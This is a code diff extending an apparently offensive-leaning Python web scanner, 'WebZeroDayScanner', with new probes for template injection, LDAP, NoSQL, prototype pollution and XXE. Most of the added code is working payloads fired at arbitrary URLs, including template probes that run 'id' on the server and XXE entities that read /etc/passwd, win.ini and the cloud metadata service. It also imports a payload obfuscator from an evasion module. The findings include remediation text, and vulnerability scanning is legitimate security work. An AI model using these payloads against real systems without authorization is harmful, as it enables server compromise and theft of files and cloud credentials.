@@ -18,7 +18,7 @@ import sys
 import time
 import uuid
 from dataclasses import dataclass, field
-from typing import Optional
+from typing import Any, Optional
 
 try:
     import aiohttp
@@ -296,7 +296,7 @@ class WebZeroDayScanner:
         self.timeout = timeout
         self.mutation = MutationEngine()
 
-    async def scan_endpoint(self, session: aiohttp.ClientSession, url: str,
+    async def scan_endpoint(self, session: Any, url: str,
                             params: list[str], method: str = "GET") -> list[ZeroDayCandidate]:
         """Scan a web endpoint for zero-day vulnerabilities."""
         candidates = []
@@ -307,7 +307,7 @@ class WebZeroDayScanner:
             if cmdi:
                 candidates.append(cmdi)
 
-            # 2. SSTI (Server-Side Template Injection)
+            # 2. SSTI (Server-Side Template Injection) — extended engine coverage
             ssti = await self._test_ssti(session, url, param, method)
             if ssti:
                 candidates.append(ssti)
@@ -322,13 +322,32 @@ class WebZeroDayScanner:
             if intover:
                 candidates.append(intover)
 
-            # 5. Header injection
-            header_vulns = await self._test_header_injection(session, url)
-            candidates.extend(header_vulns)
+            # 5. LDAP injection
+            ldap = await self._test_ldap_injection(session, url, param, method)
+            if ldap:
+                candidates.append(ldap)
+
+            # 6. NoSQL injection (MongoDB / Redis / Elasticsearch)
+            nosql_vulns = await self._test_nosql_injection(session, url, param, method)
+            candidates.extend(nosql_vulns)
+
+            # 7. Prototype pollution (JavaScript frameworks)
+            proto = await self._test_prototype_pollution(session, url, param, method)
+            if proto:
+                candidates.append(proto)
+
+        # 8. Header injection (once per URL)
+        header_vulns = await self._test_header_injection(session, url)
+        candidates.extend(header_vulns)
+
+        # 9. XML / XXE (once per URL)
+        xxe = await self._test_xxe(session, url)
+        if xxe:
+            candidates.append(xxe)
 
         return candidates
 
-    async def _test_command_injection(self, session: aiohttp.ClientSession, url: str,
+    async def _test_command_injection(self, session: Any, url: str,
                                        param: str, method: str) -> Optional[ZeroDayCandidate]:
         """Detect command injection via time-based differential analysis."""
         try:
@@ -362,39 +381,388 @@ class WebZeroDayScanner:
             pass
         return None
 
-    async def _test_ssti(self, session: aiohttp.ClientSession, url: str,
+    async def _test_ssti(self, session: Any, url: str,
                           param: str, method: str) -> Optional[ZeroDayCandidate]:
-        """Detect Server-Side Template Injection."""
-        # Use mathematical expressions that template engines evaluate
+        """
+        Detect Server-Side Template Injection across all major engines.
+        Probes: Jinja2, Twig, Freemarker, Velocity, Smarty, ERB, Pebble, Groovy,
+                Mako, Handlebars, Nunjucks, Mustache, Spring SpEL.
+        """
         probes = [
-            ("{{7*7}}", "49"),
-            ("${7*7}", "49"),
-            ("<%=7*7%>", "49"),
-            ("#{7*7}", "49"),
-            ("{{7*'7'}}", "7777777"),
-            ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime"),  # Spring detection
+            # Jinja2 / Nunjucks / Twig basic
+            ("{{7*7}}", "49", "Jinja2/Nunjucks/Twig"),
+            # Jinja2 string multiply (unique fingerprint)
+            ("{{7*'7'}}", "7777777", "Jinja2"),
+            # Twig unique
+            ("{{_self.env.registerUndefinedFilterCallback('phpinfo')}}", "phpinfo", "Twig"),
+            # Freemarker
+            ("${7*7}", "49", "Freemarker/Spring"),
+            ("${\"freemarker.template.utility.Execute\"?new()(\"id\")}", "uid=", "Freemarker RCE"),
+            # Velocity
+            ("#set($x=7*7)${x}", "49", "Velocity"),
+            ("#set($s='')#set($s=$s.class.forName('java.lang.Runtime'))", "class", "Velocity RCE"),
+            # Smarty (PHP)
+            ("{$smarty.version}", ".", "Smarty"),
+            ("{math equation='7*7'}", "49", "Smarty math"),
+            # ERB (Ruby)
+            ("<%=7*7%>", "49", "ERB/Ruby"),
+            ("<%= `id` %>", "uid=", "ERB RCE"),
+            # Pebble
+            ("{{7*7}}", "49", "Pebble"),
+            # Spring SpEL
+            ("${T(java.lang.Runtime).getRuntime()}", "java.lang.Runtime", "Spring SpEL"),
+            ("*{7*7}", "49", "Spring SpEL Thymeleaf"),
+            # Groovy (Grails)
+            ("${7*7}", "49", "Groovy/Grails"),
+            # Handlebars / Mustache
+            ("{{#with \"s\" as |string|}}", "", "Handlebars"),
+            # Mako (Python)
+            ("${7*7}", "49", "Mako"),
+            # Polyglot
+            ("{{7*7}}${7*7}<%=7*7%>", "49", "Polyglot"),
         ]
 
         try:
-            for payload, expected in probes:
+            for payload, expected, engine in probes:
+                if not expected:
+                    continue
                 async with session.request(method, url, params={param: payload},
                                             timeout=aiohttp.ClientTimeout(total=self.timeout)) as resp:
                     body = await resp.text()
                     if expected in body and payload not in body:
                         return ZeroDayCandidate(
                             target=url, category="ssti",
-                            confidence=0.9, severity="critical",
-                            description=f"Server-Side Template Injection on param '{param}' (engine evaluated '{payload}' → '{expected}')",
-                            evidence={"param": param, "payload": payload, "expected": expected,
-                                      "found_in_response": True},
-                            remediation="Use template sandboxing. Never pass user input directly to template engines.",
-                            cwe_id="CWE-1336", technique="ssti_detection",
+                            confidence=0.93, severity="critical",
+                            description=(
+                                f"SSTI on param '{param}' — engine: {engine}. "
+                                f"Payload '{payload}' evaluated to '{expected}'. "
+                                f"RCE is likely achievable on this template engine."
+                            ),
+                            evidence={"param": param, "payload": payload,
+                                      "expected": expected, "engine": engine},
+                            remediation=(
+                                "Never pass user input to template engine render functions. "
+                                "Use sandboxed environments and whitelist template expressions."
+                            ),
+                            cwe_id="CWE-1336", technique="ssti_polyglot",
                         )
         except Exception:
             pass
         return None
 
-    async def _test_path_traversal(self, session: aiohttp.ClientSession, url: str,
+    async def _test_ldap_injection(self, session: Any, url: str,
+                                    param: str, method: str) -> Optional[ZeroDayCandidate]:
+        """
+        Detect LDAP Injection (blind via error-based and boolean differential).
+        CWE-90.
+        """
+        payloads_error = [
+            "*)(objectClass=*",
+            "*)(&(objectClass=*",
+            "*)(uid=*))(|(uid=*",
+            ")(|(password=*",
+            "admin)(&(password=*))",
+            ")(objectClass=person)(cn=*",
+        ]
+        try:
+            # Baseline
+            async with session.request(method, url, params={param: "testuser"},
+                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                base_body = await r.text()
+                base_len  = len(base_body)
+
+            # Error-based detection: LDAP error strings
+            for payload in payloads_error:
+                async with session.request(method, url, params={param: payload},
+                                            timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                    body = await r.text()
+                    ldap_errors = [
+                        "ldap_search", "LDAPException", "Invalid DN",
+                        "javax.naming", "com.sun.jndi",
+                        "Bad search filter", "invalid filter",
+                        "LDAP: error code", "NamingException",
+                    ]
+                    for err in ldap_errors:
+                        if err.lower() in body.lower():
+                            return ZeroDayCandidate(
+                                target=url, category="ldap_injection",
+                                confidence=0.85, severity="high",
+                                description=(
+                                    f"LDAP Injection on param '{param}' — error: '{err}'. "
+                                    f"May allow authentication bypass and directory enumeration."
+                                ),
+                                evidence={"param": param, "payload": payload, "error": err},
+                                remediation=(
+                                    "Escape all LDAP special characters: * ( ) \\ NUL. "
+                                    "Use parameterised LDAP queries."
+                                ),
+                                cwe_id="CWE-90", technique="ldap_error_based",
+                            )
+
+            # Boolean differential: wildcard (*) vs impossible value
+            async with session.request(method, url, params={param: "*"},
+                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                wild_body = await r.text()
+                wild_len  = len(wild_body)
+
+            async with session.request(method, url,
+                                        params={param: "HEAVEN_LDAP_NOEXI$T_XYZ123"},
+                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                false_body = await r.text()
+                false_len  = len(false_body)
+
+            # If wildcard produces significantly more content → boolean LDAP injection
+            if wild_len > false_len + 200 and wild_len > base_len:
+                return ZeroDayCandidate(
+                    target=url, category="ldap_injection",
+                    confidence=0.72, severity="high",
+                    description=(
+                        f"Boolean LDAP Injection on param '{param}': wildcard (*) "
+                        f"returns {wild_len - false_len} more bytes than impossible value."
+                    ),
+                    evidence={"param": param, "wildcard_len": wild_len, "false_len": false_len},
+                    remediation="Escape LDAP special chars. Use parameterised queries.",
+                    cwe_id="CWE-90", technique="ldap_boolean_differential",
+                )
+        except Exception:
+            pass
+        return None
+
+    async def _test_nosql_injection(self, session: Any, url: str,
+                                     param: str, method: str) -> list[ZeroDayCandidate]:
+        """
+        Detect NoSQL injection in MongoDB, Redis, Elasticsearch.
+        Tests JSON operator injection and type confusion.
+        CWE-943.
+        """
+        candidates = []
+        import json
+
+        try:
+            # Baseline
+            async with session.request(method, url, params={param: "test"},
+                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                base_body = await r.text()
+                base_status = r.status
+                base_len = len(base_body)
+
+            # MongoDB operator injection via URL parameters
+            mongo_payloads = [
+                {param + "[$gt]": ""},           # $gt operator
+                {param + "[$ne]": "invalid"},     # $ne operator — returns all
+                {param + "[$regex]": ".*"},        # regex match all
+                {param + "[$exists]": "true"},     # field existence
+                {param + "[$where]": "1==1"},      # $where (deprecated but possible)
+            ]
+            for payload_dict in mongo_payloads:
+                try:
+                    async with session.request(method, url, params=payload_dict,
+                                                timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                        body = await r.text()
+                        # If MongoDB operator returns MORE data than a specific value → injection
+                        if r.status == 200 and len(body) > base_len + 100:
+                            candidates.append(ZeroDayCandidate(
+                                target=url, category="nosql_injection",
+                                confidence=0.80, severity="critical",
+                                description=(
+                                    f"MongoDB NoSQL Injection on '{param}' — "
+                                    f"operator '{list(payload_dict.keys())[0]}' "
+                                    f"returned {len(body) - base_len} more bytes. "
+                                    f"Authentication bypass or data exfiltration possible."
+                                ),
+                                evidence={"param": param, "payload": payload_dict,
+                                          "base_len": base_len, "response_len": len(body)},
+                                remediation=(
+                                    "Validate that inputs are of expected type. "
+                                    "Reject objects/arrays where strings are expected. "
+                                    "Use mongoose schema type enforcement."
+                                ),
+                                cwe_id="CWE-943", technique="nosql_operator_injection",
+                            ))
+                            break
+                except Exception:
+                    continue
+
+            # JSON body injection for POST endpoints
+            if method.upper() == "POST":
+                json_payloads = [
+                    {param: {"$gt": ""}},
+                    {param: {"$ne": None}},
+                    {param: {"$regex": ".*", "$options": "i"}},
+                ]
+                for json_body in json_payloads:
+                    try:
+                        async with session.post(
+                            url,
+                            data=json.dumps(json_body),
+                            headers={"Content-Type": "application/json"},
+                            timeout=aiohttp.ClientTimeout(total=self.timeout),
+                        ) as r:
+                            body = await r.text()
+                            if r.status == 200 and len(body) > base_len + 50:
+                                candidates.append(ZeroDayCandidate(
+                                    target=url, category="nosql_injection",
+                                    confidence=0.82, severity="critical",
+                                    description=(
+                                        f"MongoDB NoSQL Injection (JSON body) on '{param}' — "
+                                        f"operator injection returned excess data."
+                                    ),
+                                    evidence={"param": param, "payload": json_body},
+                                    remediation="Validate JSON input types. Use strict schema validation.",
+                                    cwe_id="CWE-943", technique="nosql_json_injection",
+                                ))
+                                break
+                    except Exception:
+                        continue
+
+        except Exception:
+            pass
+        return candidates
+
+    async def _test_prototype_pollution(self, session: Any, url: str,
+                                         param: str, method: str) -> Optional[ZeroDayCandidate]:
+        """
+        Detect server-side prototype pollution in Node.js applications.
+        Injects __proto__ and constructor.prototype keys and checks for
+        reflected properties or application behaviour changes.
+        CWE-1321.
+        """
+        import json
+
+        pollution_payloads = [
+            # URL parameter pollution
+            {f"{param}[__proto__][polluted]": "heaven_proto_probe"},
+            {f"{param}[constructor][prototype][polluted]": "heaven_proto_probe"},
+            # Encoded variants
+            {param: "__proto__[polluted]=heaven_proto_probe"},
+        ]
+        json_pollution = [
+            {"__proto__": {"polluted": "heaven_proto_probe"}},
+            {"constructor": {"prototype": {"polluted": "heaven_proto_probe"}}},
+        ]
+
+        try:
+            async with session.request(method, url, params={param: "normal"},
+                                        timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                base_body = await r.text()
+                base_status = r.status
+
+            for payload_dict in pollution_payloads:
+                try:
+                    async with session.request(method, url, params=payload_dict,
+                                                timeout=aiohttp.ClientTimeout(total=self.timeout)) as r:
+                        body = await r.text()
+                        if "heaven_proto_probe" in body and r.status == 200:
+                            return ZeroDayCandidate(
+                                target=url, category="prototype_pollution",
+                                confidence=0.88, severity="high",
+                                description=(
+                                    f"Server-Side Prototype Pollution on '{param}' — "
+                                    f"polluted property reflected in response. "
+                                    f"May allow RCE via gadget chains in Express/Lodash/etc."
+                                ),
+                                evidence={"param": param, "payload": payload_dict,
+                                          "reflected_value": "heaven_proto_probe"},
+                                remediation=(
+                                    "Use Object.freeze(Object.prototype) or object spread. "
+                                    "Patch Lodash to >=4.17.21. Validate input keys. "
+                                    "Use JSON schema with additionalProperties: false."
+                                ),
+                                cwe_id="CWE-1321", technique="prototype_pollution_reflection",
+                            )
+                except Exception:
+                    continue
+
+            # JSON body pollution
+            for payload in json_pollution:
+                try:
+                    async with session.post(
+                        url,
+                        data=json.dumps(payload),
+                        headers={"Content-Type": "application/json"},
+                        timeout=aiohttp.ClientTimeout(total=self.timeout),
+                    ) as r:
+                        body = await r.text()
+                        if "heaven_proto_probe" in body:
+                            return ZeroDayCandidate(
+                                target=url, category="prototype_pollution",
+                                confidence=0.90, severity="high",
+                                description=(
+                                    "Server-Side Prototype Pollution via JSON body — "
+                                    "__proto__ key accepted and property reflected."
+                                ),
+                                evidence={"payload": payload, "reflected": True},
+                                remediation="Strip __proto__ and constructor keys from JSON input.",
+                                cwe_id="CWE-1321", technique="prototype_pollution_json",
+                            )
+                except Exception:
+                    continue
+
+        except Exception:
+            pass
+        return None
+
+    async def _test_xxe(self, session: Any,
+                         url: str) -> Optional[ZeroDayCandidate]:
+        """
+        Test for XML External Entity injection via multiple attack vectors.
+        CWE-611.
+        """
+        import uuid as _uuid
+        canary = _uuid.uuid4().hex[:12]
+
+        xxe_payloads = [
+            # Classic file read
+            (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
+             f'<test>&xxe;</test>', "root:x:0", "file_read"),
+            # Windows file read
+            (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
+             f'<test>&xxe;</test>', "[extensions]", "windows_file_read"),
+            # SSRF via XXE
+            (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
+             f'<test>&xxe;</test>', "ami-id", "ssrf_cloud_metadata"),
+            # Error-based XXE
+            (f'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]>',
+             "root:", "error_based"),
+            # Billion laughs DoS indicator (small payload to test)
+            ('<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]>'
+             '<lolz>&lol2;</lolz>', "", "dos_indicator"),
+        ]
+
+        for payload, indicator, technique in xxe_payloads:
+            if not indicator:
+                continue
+            try:
+                async with session.post(
+                    url,
+                    data=payload,
+                    headers={"Content-Type": "application/xml"},
+                    timeout=aiohttp.ClientTimeout(total=self.timeout),
+                ) as r:
+                    body = await r.text()
+                    if indicator in body:
+                        return ZeroDayCandidate(
+                            target=url, category="xxe",
+                            confidence=0.95, severity="critical",
+                            description=(
+                                f"XML External Entity (XXE) Injection — {technique}. "
+                                f"Indicator '{indicator}' found in response. "
+                                f"Allows reading server files and internal SSRF."
+                            ),
+                            evidence={"technique": technique, "indicator": indicator,
+                                      "payload": payload[:200]},
+                            remediation=(
+                                "Disable external entity processing in your XML parser. "
+                                "In Java: factory.setFeature(XMLConstants.FEATURE_SECURE_PROCESSING, true). "
+                                "In Python: use defusedxml."
+                            ),
+                            cwe_id="CWE-611", technique=f"xxe_{technique}",
+                        )
+            except Exception:
+                continue
+        return None
+
+    async def _test_path_traversal(self, session: Any, url: str,
                                     param: str, method: str) -> Optional[ZeroDayCandidate]:
         """Detect path traversal / local file inclusion."""
         from heaven.recon.evasion_engine import PayloadObfuscator
@@ -429,7 +797,7 @@ class WebZeroDayScanner:
             pass
         return None
 
-    async def _test_integer_overflow(self, session: aiohttp.ClientSession, url: str,
+    async def _test_integer_overflow(self, session: Any, url: str,
                                       param: str, method: str) -> Optional[ZeroDayCandidate]:
         """Detect integer overflow/underflow vulnerabilities."""
         payloads = MutationEngine.integer_overflow_payloads()
@@ -471,7 +839,7 @@ class WebZeroDayScanner:
             pass
         return None
 
-    async def _test_header_injection(self, session: aiohttp.ClientSession,
+    async def _test_header_injection(self, session: Any,
                                       url: str) -> list[ZeroDayCandidate]:
         """Test for HTTP header-based vulnerabilities."""
         candidates = []
